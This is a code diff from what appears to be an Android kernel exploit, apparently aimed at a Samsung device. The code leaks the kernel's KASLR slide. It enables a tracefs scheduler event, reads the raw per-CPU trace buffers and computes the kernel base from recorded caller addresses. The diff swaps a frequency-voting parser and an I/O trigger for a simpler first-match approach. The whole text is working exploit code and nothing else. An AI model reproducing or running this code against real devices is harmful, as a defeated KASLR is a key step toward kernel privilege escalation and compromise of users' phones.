@@ -1,21 +1,6 @@
 #include "common.h"
 
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
-#ifndef SLIDE_TRACEFS_EVENT_ID
-#define SLIDE_TRACEFS_EVENT_ID 109
-#endif
-/*
- * Candidate granularity of the image KASLR slide. The historical default is
- * 64 KiB, but Samsung ABL-randomized 39-bit images have been observed with
- * 32 KiB granularity (e.g. slides 0x18000/0x1c8000/0xd8000), so targets whose
- * device behaves that way may relax the mask. The candidate is picked by
- * frequency across every parsed record, not by first match, so a relaxed mask
- * cannot be hijacked by an unrelated caller that happens to land in range.
- */
-#ifndef SLIDE_TRACEFS_CANDIDATE_MASK
-#define SLIDE_TRACEFS_CANDIDATE_MASK 0xffffULL
-#endif
-#define SLIDE_TRACEFS_CANDIDATE_SLOTS 64
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -28,11 +13,10 @@ static int slide_tracefs_write(const char *path, const char *value) {
   return wrote == (ssize_t)len;
 }
 
-static void slide_tracefs_tally_page(
-    const unsigned char *page, size_t page_len, uintptr_t *slots,
-    unsigned *counts, size_t *used) {
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *out) {
   if (page_len < 20) {
-    return;
+    return 0;
   }
 
   uint64_t commit = 0;
@@ -69,78 +53,25 @@ static void slide_tracefs_tally_page(
     if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
+
+      /* KASLR slide = caller - expected_caller_offset from KIMAGE_TEXT_BASE.
+       * ARM64 KASLR is 2MB-aligned (0x200000), so check 4KB alignment as minimum. */
       uint64_t link_caller =
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL &&
-            (candidate & SLIDE_TRACEFS_CANDIDATE_MASK) == 0) {
-          for (size_t index = 0; index < *used; index++) {
-            if (slots[index] == (uintptr_t)candidate) {
-              counts[index]++;
-              goto next_record;
-            }
-          }
-          if (*used < SLIDE_TRACEFS_CANDIDATE_SLOTS) {
-            slots[*used] = (uintptr_t)candidate;
-            counts[*used] = 1;
-            (*used)++;
-          }
+        if ((candidate & 0xfffULL) == 0) {
+          pr_success("slide tracefs caller=%016llx candidate=%016llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          *out = (uintptr_t)candidate;
+          return 1;
         }
       }
     }
-next_record:
     pos = record + record_len;
   }
-}
-
-static int slide_tracefs_trigger(void) {
-  char path[96];
-  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
-  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
-  if (fd < 0) {
-    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
-    return 0;
-  }
-  size_t chunk_size = 0x40000;
-  unsigned char *chunk = calloc(1, chunk_size);
-  if (!chunk) {
-    int saved_errno = errno;
-    close(fd);
-    unlink(path);
-    errno = saved_errno;
-    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
-    return 0;
-  }
-  int ok = 1;
-  for (int round = 0; round < 16 && ok; round++) {
-    size_t done = 0;
-    while (done < chunk_size) {
-      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
-      if (wrote < 0 && errno == EINTR) {
-        continue;
-      }
-      if (wrote <= 0) {
-        ok = 0;
-        break;
-      }
-      done += (size_t)wrote;
-    }
-  }
-  free(chunk);
-  if (ok && fsync(fd) != 0) {
-    ok = 0;
-  }
-  int saved_errno = errno;
-  close(fd);
-  unlink(path);
-  errno = saved_errno;
-  if (!ok) {
-    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
-    return 0;
-  }
-  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
-  return 1;
+  return 0;
 }
 
 static int slide_tracefs_leak_kernel_base(void) {
@@ -151,7 +82,9 @@ static int slide_tracefs_leak_kernel_base(void) {
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-  if (!slide_tracefs_write(tracing_on, "0")) {
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
     return 0;
   }
@@ -160,28 +93,13 @@ static int slide_tracefs_leak_kernel_base(void) {
   if (trace_fd >= 0) {
     close(trace_fd);
   }
-  if (!slide_tracefs_write(event_enable, "1") ||
-      !slide_tracefs_write(tracing_on, "1")) {
-    pr_error("slide tracefs setup failed errno=%d\n", errno);
-    return 0;
-  }
-  if (!slide_tracefs_trigger()) {
-    slide_tracefs_write(tracing_on, "0");
-    slide_tracefs_write(event_enable, "0");
-    return 0;
-  }
-  sleep(1);
+  sleep(5);
   slide_tracefs_write(tracing_on, "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   uintptr_t candidate = 0;
   int found = 0;
-  uintptr_t slots[SLIDE_TRACEFS_CANDIDATE_SLOTS];
-  unsigned counts[SLIDE_TRACEFS_CANDIDATE_SLOTS];
-  size_t used = 0;
-  memset(slots, 0, sizeof(slots));
-  memset(counts, 0, sizeof(counts));
-  for (int cpu = 0; cpu < cpu_count; cpu++) {
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
              SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
@@ -192,24 +110,14 @@ static int slide_tracefs_leak_kernel_base(void) {
     unsigned char page[4096];
     ssize_t got;
     while ((got = read(fd, page, sizeof(page))) > 0) {
-      slide_tracefs_tally_page(page, (size_t)got, slots, counts, &used);
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
     }
     close(fd);
   }
   slide_tracefs_write(event_enable, "0");
-  size_t best = 0;
-  for (size_t index = 1; index < used; index++) {
-    if (counts[index] > counts[best]) {
-      best = index;
-    }
-  }
-  if (used > 0) {
-    found = 1;
-    candidate = slots[best];
-    pr_success("slide tracefs caller candidate=%08llx observations=%u "
-               "distinct=%zu\n",
-               (unsigned long long)candidate, counts[best], used);
-  }
   if (!found) {
     pr_error("slide tracefs worker caller not found\n");
     return 0;
